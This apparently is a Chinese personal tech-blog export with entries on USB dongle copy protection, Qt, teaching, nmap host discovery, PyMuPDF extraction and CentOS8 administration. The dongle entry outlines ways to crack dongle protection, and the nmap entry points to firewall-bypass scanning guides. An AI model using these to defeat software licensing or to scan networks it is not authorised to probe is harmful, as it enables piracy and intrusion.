    <url>/2023/12/14/%E5%8A%A0%E5%AF%86%E7%8B%97%E7%A0%B4%E8%A7%A3%E5%8E%9F%E7%90%86%E4%B8%8E%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>加密狗是目前流行的一种软件加密工具。它是插在计算机接口上的软硬件结合的软件加密产品。一般有USB口和并口两种，又称USB加密狗和并口加密狗，目前流行的一般是USB加密狗，并口加密狗在前几年的时候用得比较多。</p>
<h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>举个例子说明单片机算法的使用。 比如一段程序中有这样一句：A=Fx(3)。程序要根据常量3来得到变量A的值。于是，我们就可以把原程序这样改写：A=Fx(DogConvert(1)-12342)。那么原程序中就不会出现常量3，而取之以DogConvert(1)-12342。这样，只有软件编写者才知道实际调用的常量是3。而如果没有加密狗，DogConvert函数就不能返回正确结果，结果算式A=Fx(DogConvert(1)-12342)结果也肯定不会正确。这种使盗版用户得不到软件使用价值的加密方式，要比一发现非法使用就警告、中止的加密方式更温和、更隐蔽、更令解密者难以琢磨。此外，加密狗还有读写函数可以用作对加密狗内部的存储器的读写。于是我们可以把上算式中的12342也写到软件加密狗的存储器中去，令A的值完全取决于DogConvert()和DogRead()函数的结果，令解密难上加难。</p>
<h1 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h1><ul>
<li>一种是通过硬件克隆或者复制</li>
<li>一种是通过SoftICE等Debug工具调试跟踪解密</li>
<li>一种是通过编写拦截程序修改软件和加密狗之间的通讯</li>
</ul>
<p>目前最常用的免加密狗补丁破解则就是属于第三种破解方式。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/ttyy1112/article/details/125000317" target="_blank" rel="noopener">加密狗工作原理和破解方法简介</a>,by 阿湯哥.</li>
<li><a href="https://bbs.kanxue.com/thread-255826.htm" target="_blank" rel="noopener">[转帖]加密狗破解经验分享</a>,by Jayce189.</li>
<li><a href="http://www.wiseauth.com/2018/information_0706/80.html" target="_blank" rel="noopener">加密狗原理及如何对抗破解</a>,by 唯赛科技.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解QT编码技巧</title>
    <url>/2023/12/24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3QT%E7%BC%96%E7%A0%81%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>Qt代码采用面向对象的方法进行编程，要理解Qt代码，理解其各种机制，应从Qt的祖先类开始。</p>
<h1 id="QObject分析"><a href="#QObject分析" class="headerlink" title="QObject分析"></a>QObject分析</h1><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/tgycoder/p/5522920.html" target="_blank" rel="noopener">深入了解Qt（一）之QObject</a></li>
</ul>
<h1 id="元对象系统（Meta-Object-System）"><a href="#元对象系统（Meta-Object-System）" class="headerlink" title="元对象系统（Meta-Object System）"></a>元对象系统（Meta-Object System）</h1><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/tgycoder/p/5524735.html" target="_blank" rel="noopener">深入了解Qt（二）之元对象系统（Meta-Object System）</a></li>
</ul>
<h1 id="元signal和slot"><a href="#元signal和slot" class="headerlink" title="元signal和slot"></a>元signal和slot</h1><ul>
<li><a href="https://www.cnblogs.com/tgycoder/p/5527429.html" target="_blank" rel="noopener">深入了解Qt（三）之元signal和slot</a></li>
</ul>
<h1 id="QWidget分析"><a href="#QWidget分析" class="headerlink" title="QWidget分析"></a>QWidget分析</h1><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/lifexy/p/8876016.html" target="_blank" rel="noopener">2.QT-窗口组件(QWidget),QT坐标系统,初探消息处理(信号与槽)</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/tgycoder/p/5522920.html" target="_blank" rel="noopener">深入了解Qt（一）之QObject</a>,by RunningSnail.</li>
<li><a href="https://www.cnblogs.com/tgycoder/p/5524735.html" target="_blank" rel="noopener">深入了解Qt（二）之元对象系统（Meta-Object System）</a>,by RunningSnail.</li>
<li><a href="https://www.cnblogs.com/tgycoder/p/5527429.html" target="_blank" rel="noopener">深入了解Qt（三）之元signal和slot</a>,by RunningSnail.</li>
<li><a href="https://www.cnblogs.com/lifexy/p/8876016.html" target="_blank" rel="noopener">2.QT-窗口组件(QWidget),QT坐标系统,初探消息处理(信号与槽)</a>,by 诺谦.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>如何成为卓越的大学教师读书笔记</title>
    <url>/2023/12/27/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E5%8D%93%E8%B6%8A%E7%9A%84%E5%A4%A7%E5%AD%A6%E6%95%99%E5%B8%88%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>学生学习得遇名师是一种幸运，那么怎样成为这样的名师呢？</p>
<h1 id="怎样才算“卓越”"><a href="#怎样才算“卓越”" class="headerlink" title="怎样才算“卓越”"></a>怎样才算“卓越”</h1><h1 id="卓越的教师知道学生怎样学习吗"><a href="#卓越的教师知道学生怎样学习吗" class="headerlink" title="卓越的教师知道学生怎样学习吗?"></a>卓越的教师知道学生怎样学习吗?</h1><h1 id="卓越的教师是如何备课的？"><a href="#卓越的教师是如何备课的？" class="headerlink" title="卓越的教师是如何备课的？"></a>卓越的教师是如何备课的？</h1><h1 id="卓越的教师对学生有什么期望？"><a href="#卓越的教师对学生有什么期望？" class="headerlink" title="卓越的教师对学生有什么期望？"></a>卓越的教师对学生有什么期望？</h1><h1 id="卓越的教师如何驾驭课堂？"><a href="#卓越的教师如何驾驭课堂？" class="headerlink" title="卓越的教师如何驾驭课堂？"></a>卓越的教师如何驾驭课堂？</h1><h1 id="卓越的教师如何对待学生？"><a href="#卓越的教师如何对待学生？" class="headerlink" title="卓越的教师如何对待学生？"></a>卓越的教师如何对待学生？</h1><h1 id="卓越的教师如何评估学生和自己？"><a href="#卓越的教师如何评估学生和自己？" class="headerlink" title="卓越的教师如何评估学生和自己？"></a>卓越的教师如何评估学生和自己？</h1><h1 id="从卓越的教师身上我们能够学到什么"><a href="#从卓越的教师身上我们能够学到什么" class="headerlink" title="从卓越的教师身上我们能够学到什么?"></a>从卓越的教师身上我们能够学到什么?</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/2287720/" target="_blank" rel="noopener">如何成为卓越的大学教师</a>,by 肯•贝恩.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>管理</tag>
        <tag>教学</tag>
      </tags>
  </entry>
  <entry>
    <title>IP监控分析的方法</title>
    <url>/2024/01/07/IP%E7%9B%91%E6%8E%A7%E5%88%86%E6%9E%90%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>公司内网IP地址资源有限，同时又存在很多分配后的IP长期不使用的情况。为提高IP地址资源的利用效率，需要监控IP的使用情况，统计IP的活动情况，收回长期不上线的IP地址资源，以便重新利用。需要解决的技术难点主要有三个方面:</p>
<ul>
<li>扫描网络存活主机的方法。</li>
<li>每日定时扫描网络存活主机的方法。</li>
<li>统计IP活动情况的方法。</li>
</ul>
<h1 id="扫描网络存活主机"><a href="#扫描网络存活主机" class="headerlink" title="扫描网络存活主机"></a>扫描网络存活主机</h1><p>扫描网络存活主机可使用以下nmap命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -P0 192.168.1.1&#x2F;24</span><br></pre></td></tr></table></figure>
<p>-P0 (无ping) 该选项可解决主机防火墙开启了禁Ping选项而无法被发现的问题，缺点是主机发现的速度将很慢。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sn -PS135 172.16.1.128 -vvv -n --disable-arp-ping</span><br><span class="line">#-n 禁用dns解析</span><br></pre></td></tr></table></figure>

<p>注意nmap扫局域网存活主机都会预先进行arp扫描，在这里禁用了端口扫描，意味着nmap只会进行存活扫描，当nmap进行arp扫描后发现主机存活就不会进行后续操作，wireshark也就抓不到包，所以使用–disable-arp-ping禁用arp扫描。</p>
<p>被扫描主机可能开启防火墙，如何绕过防火墙判断主机是否存活，请参考：</p>
<ul>
<li><a href="https://www.secpulse.com/archives/189038.html" target="_blank" rel="noopener">Nmap抓包分析与绕过Windows防火墙扫内网存活主机</a></li>
<li><a href="https://www.secpulse.com/archives/69585.html" target="_blank" rel="noopener">Nmap Ping 扫描(防火墙 Bypass)</a></li>
</ul>
<h1 id="定时扫描网络存活主机"><a href="#定时扫描网络存活主机" class="headerlink" title="定时扫描网络存活主机"></a>定时扫描网络存活主机</h1><p>目前倾向于使用Python在代码中定时调用nmap命令扫描存活主机。一日之内可扫描三次：上午、下午、晚上各一次。</p>
<p>可参考以下链接：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/411506332" target="_blank" rel="noopener">让 Python 程序定时执行的 8 种姿势～</a></li>
</ul>
<p>目前倾向于利用调度模块schedule实现定时任务。</p>
<h1 id="统计IP活动情况"><a href="#统计IP活动情况" class="headerlink" title="统计IP活动情况"></a>统计IP活动情况</h1><p>主要统计IP地址的未上线的天数。</p>
<h1 id="设置Python脚本开机自启动"><a href="#设置Python脚本开机自启动" class="headerlink" title="设置Python脚本开机自启动"></a>设置Python脚本开机自启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d:  #如果需要开机自启动的python程序在c盘，不需要这一行程序；如果需要自启动的python程序在d盘（或其他盘），需要先切换到d盘（或其他盘）</span><br><span class="line">cd path  #path为你所要开机自启动的python程序所在的文件夹</span><br><span class="line">python xxx.py  #xxx.py为path文件夹内需要自启动的python程序</span><br></pre></td></tr></table></figure>

<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_44159028/article/details/120291865" target="_blank" rel="noopener">Nmap扫描结果保存到本地并提取ip</a>,by ~Echo.</li>
<li><a href="https://blog.51cto.com/lifulin/4350789" target="_blank" rel="noopener">nmap命令扫描存活主机</a>,by qingfenghaha.</li>
<li><a href="https://zh.wikipedia.org/wiki/Nmap" target="_blank" rel="noopener">Nmap</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/43820903" target="_blank" rel="noopener">nmap用法解析</a>,by wikipeida.</li>
<li><a href="https://www.cnblogs.com/brogong/p/7929298.html" target="_blank" rel="noopener">Python中匹配IP的正则表达式</a>,by bro.</li>
<li><a href="https://zhuanlan.zhihu.com/p/411506332" target="_blank" rel="noopener">让 Python 程序定时执行的 8 种姿势～</a>,by 随风.</li>
<li><a href="https://zhuanlan.zhihu.com/p/92152648" target="_blank" rel="noopener">Python 定时任务最佳实践</a>,by guoweikuang​.</li>
<li><a href="https://cloud.tencent.com/developer/article/2087119" target="_blank" rel="noopener">Windows 设置 Python 脚本开机自启的一些心得</a>,by Hsinyan.</li>
<li><a href="https://blog.csdn.net/ego782140379/article/details/94589623" target="_blank" rel="noopener">设置python程序开机自启动</a>,by ego782140379.</li>
<li><a href="https://www.secpulse.com/archives/189038.html" target="_blank" rel="noopener">Nmap抓包分析与绕过Windows防火墙扫内网存活主机</a>,by 合天网安实验室.</li>
<li><a href="https://www.secpulse.com/archives/69585.html" target="_blank" rel="noopener">Nmap Ping 扫描(防火墙 Bypass)</a>,by 一叶知安.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Python提取PDF部分区域文字的方法</title>
    <url>/2024/01/09/Python%E6%8F%90%E5%8F%96PDF%E9%83%A8%E5%88%86%E5%8C%BA%E5%9F%9F%E6%96%87%E5%AD%97%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近遇到一个需求，需要提取PDF部分区域的文字，具体方法如下：</p>
<ol>
<li>提取PDF中目标内容所在区域</li>
<li>提取或识别目标区域内容</li>
</ol>
<p>为了快速验证方法的可行性，使用Python结合PyMuPDF库进行开发。</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="PyMuPDF介绍"><a href="#PyMuPDF介绍" class="headerlink" title="PyMuPDF介绍"></a>PyMuPDF介绍</h2><p>PyMuPDF是一个高性能的Python库，用于PDF（和其他）文档的数据提取、分析、转换和操作。</p>
<h2 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h2><ul>
<li>python 3.8.5，可在windows7上运行，python 3.9以后版本不支持windows7</li>
<li>numpy==1.24.4</li>
<li>pandas==2.0.3</li>
<li>PyMuPDF==1.23.8</li>
<li>PyMuPDFb==1.23.7</li>
<li>python-dateutil==2.8.2</li>
<li>pytz==2023.3.post1</li>
<li>six==1.16.0</li>
<li>tzdata==2023.4</li>
</ul>
<h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir pdf_extract</span><br><span class="line">cd pdf_extract</span><br><span class="line">python -m venv env</span><br><span class="line">env\Scripts\activate.bat</span><br><span class="line">pip install pymupdf</span><br><span class="line">pip install pandas</span><br><span class="line">pip freeze &gt; requirement.txt</span><br><span class="line">pip download -d packages -r requirement.txt</span><br></pre></td></tr></table></figure>

<h2 id="离线迁移"><a href="#离线迁移" class="headerlink" title="离线迁移"></a>离线迁移</h2><p>创建envConfig.bat批处理文件，一键执行离线环境配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m venv env</span><br><span class="line">call env\Scripts\activate.bat</span><br><span class="line">pip install --no-index --find-links&#x3D;packages -r requirement.txt</span><br></pre></td></tr></table></figure>

<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import fitz # imports the pymupdf library</span><br><span class="line">pdfDoc &#x3D; fitz.open(&quot;test.pdf&quot;) # open a document</span><br><span class="line">page &#x3D; pdfDoc[0]</span><br><span class="line">mat &#x3D; fitz.Matrix(1, 1)  # 1.5表示放大1.5倍</span><br><span class="line">rect &#x3D; page.rect</span><br><span class="line">#print(rect)</span><br><span class="line">clip &#x3D; fitz.Rect(0.22*rect.width, 0.19*rect.height,0.35*rect.width, 0.40*rect.height)</span><br><span class="line">pix &#x3D; page.get_pixmap(matrix&#x3D;mat, alpha&#x3D;False, clip&#x3D;clip)</span><br><span class="line">pix.save(&quot;test.png&quot;) </span><br><span class="line">a_text &#x3D; page.get_text(clip&#x3D;clip)</span><br><span class="line">print(a_text)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cloud.tencent.com/developer/article/1857888" target="_blank" rel="noopener">Python截图PDF，在指定区域并提取文本</a>,by 快学Python.</li>
<li><a href="https://pymupdf.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">pymupdf doc</a>,by pymupdf.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS8服务器运维记录</title>
    <url>/2024/01/19/Centos8%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>最近需要在CentOS8中部署一个大型系统，因此记录一下CentOS8的运维过程。</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
<li>联想图形工作站ThinkStation P720</li>
<li>CentOS 8.5.2111</li>
<li>NVIDIA-Linux-x86_64-535.113.01.run</li>
</ul>
<h1 id="CentOS8系统安装"><a href="#CentOS8系统安装" class="headerlink" title="CentOS8系统安装"></a>CentOS8系统安装</h1><p>请参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/85807189" target="_blank" rel="noopener">CentOS 8 安装图解</a></li>
</ul>
<p>重点在磁盘分区那块。</p>
<h1 id="Yum本地源配置"><a href="#Yum本地源配置" class="headerlink" title="Yum本地源配置"></a>Yum本地源配置</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/yj2434/article/details/108823689" target="_blank" rel="noopener">Centos8配置本地yum源教程超详细</a></li>
<li><a href="https://www.jianshu.com/p/68db74388600" target="_blank" rel="noopener">RedHat/CentOS8 【国内/本地/私有 Yum 源】制作和使用</a></li>
</ul>
<p>具体步骤如下：</p>
<ul>
<li>准备yum本地源。yum源可以来自CentOS8的安装光盘，也可以通过工具 reposync 、createrepo 自建，并挪到本地。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[centos@yum-srv ~]$ sudo mkdir -p &#x2F;repos&#x2F;centos-8-x86_64</span><br><span class="line">[centos@yum-srv ~]$ sudo dnf install yum-utils createrepo</span><br><span class="line">[centos@yum-srv ~]$ sudo dnf repolist</span><br><span class="line">[centos@yum-srv ~]$ sudo reposync --repoid&#x3D;AppStream --repoid&#x3D;BaseOS --repoid&#x3D;extras -p &#x2F;repos&#x2F;centos-8-x86_64</span><br><span class="line">[centos@yum-srv ~]$ sudo wget -O &#x2F;repos&#x2F;centos-8-x86_64&#x2F;RPM-GPG-KEY-CentOS-Official http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;centos&#x2F;RPM-GPG-KEY-CentOS-Official</span><br><span class="line"></span><br><span class="line">[centos@yum-srv ~]$ sudo createrepo -p &#x2F;repos&#x2F;centos-8-x86_64&#x2F;AppStream</span><br><span class="line">[centos@yum-srv ~]$ sudo createrepo -p &#x2F;repos&#x2F;centos-8-x86_64&#x2F;BaseOS</span><br><span class="line">[centos@yum-srv ~]$ sudo createrepo -p &#x2F;repos&#x2F;centos-8-x86_64&#x2F;extras</span><br></pre></td></tr></table></figure>

<ul>
<li>配置本地yum源。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@yum-srv]# vim &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Media.repo</span><br><span class="line"></span><br><span class="line">[local]</span><br><span class="line">name&#x3D;local repo</span><br><span class="line">baseurl&#x3D;file:&#x2F;&#x2F;&#x2F;mnt&#x2F;cdrom&#x2F;BaseOS</span><br><span class="line">enable&#x3D;1</span><br><span class="line">gpgcheck&#x3D;1</span><br><span class="line">gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-centosofficia</span><br></pre></td></tr></table></figure>

<ul>
<li>屏蔽默认的其他网络镜像</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@yum-srv]# vim &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo</span><br></pre></td></tr></table></figure>

<p>在base，AppStream，Extra三个镜像源中分别添加enabled=0即可。</p>
<ul>
<li>更新yum源并验证结果</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@yum-srv]# yum clean all</span><br><span class="line">[root@yum-srv]# yum makecache</span><br><span class="line">[root@yum-srv]# yum search java</span><br></pre></td></tr></table></figure>

<h1 id="Nvidia显卡驱动安装"><a href="#Nvidia显卡驱动安装" class="headerlink" title="Nvidia显卡驱动安装"></a>Nvidia显卡驱动安装</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/robator/article/details/120497644" target="_blank" rel="noopener">centos8 安装nvidia 显卡驱动（一路踩坑一路填）</a></li>
<li><a href="https://docs.nvidia.com/datacenter/tesla/tesla-installation-notes/index.html" target="_blank" rel="noopener">NVIDIA Driver Installation Quickstart Guide</a></li>
</ul>
<p>具体步骤如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@yum-srv]# yum install -y kernel-devel elfutils-libelf-devel</span><br><span class="line">[root@yum-srv]# .&#x2F;NVIDIA-Linux-x86_64-535.113.01.run</span><br></pre></td></tr></table></figure>

<h1 id="FTP服务配置"><a href="#FTP服务配置" class="headerlink" title="FTP服务配置"></a>FTP服务配置</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_27525611/article/details/103790608" target="_blank" rel="noopener">CentOS8搭建FTP服务器</a></li>
</ul>
<p>具体步骤如下：</p>
<ul>
<li>安装vsftpd+ftp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum install -y vsftpd</span><br><span class="line">sudo yum install -y ftp # 测试使用，搭建FTP服务器只需要vsftpd</span><br></pre></td></tr></table></figure>

<ul>
<li>开启服务</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start vsftpd</span><br></pre></td></tr></table></figure>

<ul>
<li>设置开机启动</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl list-unit-files | grep vsftpd</span><br><span class="line">chkconfig vsftpd on</span><br></pre></td></tr></table></figure>

<ul>
<li>ftp用户登录测试</li>
</ul>
<p>在Windows资源管理器地址栏中输入<a href="ftp://ip，在弹出的登录窗口中输入用户名和密码登录，然后验证上传和下载文件功能是否正常。">ftp://ip，在弹出的登录窗口中输入用户名和密码登录，然后验证上传和下载文件功能是否正常。</a></p>
<h1 id="VNC远程桌面配置"><a href="#VNC远程桌面配置" class="headerlink" title="VNC远程桌面配置"></a>VNC远程桌面配置</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.51cto.com/u_2221384/2535631" target="_blank" rel="noopener">CentOS7 下 VNC 安装配置详细操作指引</a></li>
</ul>
<p>具体步骤如下：</p>
<ul>
<li>安装VNC服务器和客户端</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum install -y tigervnc-server tigervnc</span><br></pre></td></tr></table></figure>

<ul>
<li>为本地用户设置 VNC 密码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@linuxtechi ~]# su - pkumar</span><br><span class="line">[root@linuxtechi ~]$ vncpasswd</span><br></pre></td></tr></table></figure>

<ul>
<li>配置VNC服务器</li>
</ul>
<p>默认的配置文件在/lib/systemd/system/vncserver@.service，以及/etc/tigervnc/目录。</p>
<p>编辑用户配置文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo vim &#x2F;etc&#x2F;tigervnc&#x2F;vncserver.users</span><br><span class="line"></span><br><span class="line"># TigerVNC User assignment</span><br><span class="line">#</span><br><span class="line"># This file assigns users to specific VNC display numbers.</span><br><span class="line"># The syntax is &lt;display&gt;&#x3D;&lt;username&gt;. E.g.:</span><br><span class="line">#</span><br><span class="line"># :1&#x3D;andrew</span><br><span class="line"># :2&#x3D;lisa</span><br><span class="line"># :1 表示这个启动的端口为。5901，之后一次类推 :2 为 5902;</span><br><span class="line"># :2&#x3D;pkumar 表示 5902 为 pkumar 用户的远程连接;</span><br><span class="line">:2&#x3D;pkumar</span><br></pre></td></tr></table></figure>

<ul>
<li>设置VNC服务器开机自启动</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 将创建vncserver@:2.service符号链接到vncserver@.service</span><br><span class="line">systemctl enable vncserver@:2.service</span><br><span class="line"># 启动服务</span><br><span class="line">systemctl start  vncserver@:2.service</span><br></pre></td></tr></table></figure>

<p>在 @: 后面的数字 2 定义了 VNC 服务将会监听的显示端口，我们将会使用 2 ，这意味着 VNC 服务器将会监听 5902端口。</p>
<ul>
<li>连接VNC服务器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vncviewer 192.168.11.11:5902</span><br></pre></td></tr></table></figure>


<h1 id="NFS文件共享配置"><a href="#NFS文件共享配置" class="headerlink" title="NFS文件共享配置"></a>NFS文件共享配置</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_43490217/article/details/127102884" target="_blank" rel="noopener">Centos8挂载NFS共享文件夹</a></li>
</ul>
<p>具体步骤如下：</p>
<ul>
<li>nfs服务器安装配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装启动nfs服务</span><br><span class="line">$ sudo yum install nfs-utils</span><br><span class="line">$ sudo systemctl enable rpcbind</span><br><span class="line">$ sudo systemctl enable nfs-server.service</span><br><span class="line">$ sudo systemctl start rpcbind</span><br><span class="line">$ sudo systemctl start nfs-server.service</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line">$ sudo systemctl stop firewalld</span><br><span class="line">$ sudo systemctl disable firewalld</span><br><span class="line"></span><br><span class="line"># 设置共享文件夹</span><br><span class="line">$ sudo vi &#x2F;etc&#x2F;exports</span><br><span class="line"></span><br><span class="line"># 重启nfs服务</span><br><span class="line">$ sudo systemctl restart nfs-server </span><br><span class="line"></span><br><span class="line"># 在多台机器之间复制文件</span><br><span class="line"># 复制文件</span><br><span class="line">$ scp .&#x2F;source.txt user@192.168.11.11:&#x2F;home&#x2F;user&#x2F;</span><br><span class="line">$ scp user@192.168.11.11:&#x2F;home&#x2F;user&#x2F;source.txt .&#x2F;</span><br><span class="line"># 复制目录 </span><br><span class="line">$ scp -r .&#x2F;dataDir user@192.168.11.11:&#x2F;home&#x2F;user&#x2F;</span><br><span class="line">$ scp -r user@192.168.11.11:&#x2F;home&#x2F;user&#x2F;dataDir&#x2F; .&#x2F;</span><br></pre></td></tr></table></figure>

<ul>
<li>nfs客户端安装配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装NFS客户端</span><br><span class="line">$ sudo yum install nfs-common</span><br><span class="line"></span><br><span class="line"># 设置开机自动挂载</span><br><span class="line">$ sudo vim &#x2F;etc&#x2F;fstab</span><br><span class="line"></span><br><span class="line"># 添加如下内容</span><br><span class="line">192.168.11.11:&#x2F;home&#x2F;share&#x2F; &#x2F;mnt&#x2F;share nfs rw,auto,nofail,noatime,nolock,intr,tcp,actimeo&#x3D;1800,noac 0 0</span><br></pre></td></tr></table></figure>

<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看进程</span><br><span class="line">ps -ef | grep -i java</span><br><span class="line"></span><br><span class="line"># 杀死进程</span><br><span class="line">kill -9 2333</span><br><span class="line"></span><br><span class="line"># 使用户具有sudo权限</span><br><span class="line"># 添加用户到具有sudo权限的用户组</span><br><span class="line">usermod -aG wheel username</span><br><span class="line"># 将用户添加到sudoers文件</span><br><span class="line">vim &#x2F;et sudoers</span><br><span class="line"></span><br><span class="line"># 查看用户输入那些组</span><br><span class="line">groups username</span><br><span class="line">getent group</span><br><span class="line">cat &#x2F;etc&#x2F;group</span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 查看系统信息</span><br><span class="line">uname -a</span><br><span class="line">uname -r</span><br><span class="line"></span><br><span class="line"># 查看系统中设置的终端开启个数</span><br><span class="line">cat &#x2F;etc&#x2F;sysconfig&#x2F;init |egrep tty</span><br><span class="line"></span><br><span class="line"># 查看可执行程序位置</span><br><span class="line">which java</span><br><span class="line"></span><br><span class="line"># 查看网络端口</span><br><span class="line">netstat -antp</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"># 使目录下创建的文件属于某个特定的用户组</span><br><span class="line"># 创建用户组</span><br><span class="line">groupadd ateam</span><br><span class="line"># 把用户加到该用户组</span><br><span class="line">usermod -a -G ateam tom</span><br><span class="line">usermod -a -G ateam jerry</span><br><span class="line"># 修改目录为该用户组所有</span><br><span class="line">chgrp -R ateam &#x2F;srv&#x2F;blah&#x2F;</span><br><span class="line">chmod -R g+srw &#x2F;srv&#x2F;blah&#x2F;</span><br><span class="line">setfacl -R -m group:ateam:rwx &#x2F;srv&#x2F;blah&#x2F;</span><br><span class="line"></span><br><span class="line"># 解决&#x2F;var&#x2F;run&#x2F;docker.sock 属于 root:root的问题</span><br><span class="line">usermod -aG docker &lt;USER&gt;</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/85807189" target="_blank" rel="noopener">CentOS 8 安装图解</a>,by linux中国.</li>
<li><a href="https://blog.csdn.net/yj2434/article/details/108823689" target="_blank" rel="noopener">Centos8配置本地yum源教程超详细</a>,by yj2434.</li>
<li><a href="https://blog.csdn.net/robator/article/details/120497644" target="_blank" rel="noopener">centos8 安装nvidia 显卡驱动（一路踩坑一路填）</a>,by robator.</li>
<li><a href="https://blog.csdn.net/qq_27525611/article/details/103790608" target="_blank" rel="noopener">CentOS8搭建FTP服务器</a>,by 氷泠.</li>
<li><a href="https://blog.51cto.com/u_2221384/2535631" target="_blank" rel="noopener">CentOS7 下 VNC 安装配置详细操作指引</a>,by adong2838.</li>
<li><a href="https://blog.csdn.net/qq_43490217/article/details/127102884" target="_blank" rel="noopener">Centos8挂载NFS共享文件夹</a>,by 遗忘的迟来的风.</li>
<li><a href="https://cloud.tencent.com/developer/article/1626786" target="_blank" rel="noopener">在 CentOS 上如何将用户添加到 Sudoers</a>,by 雪梦科技.</li>
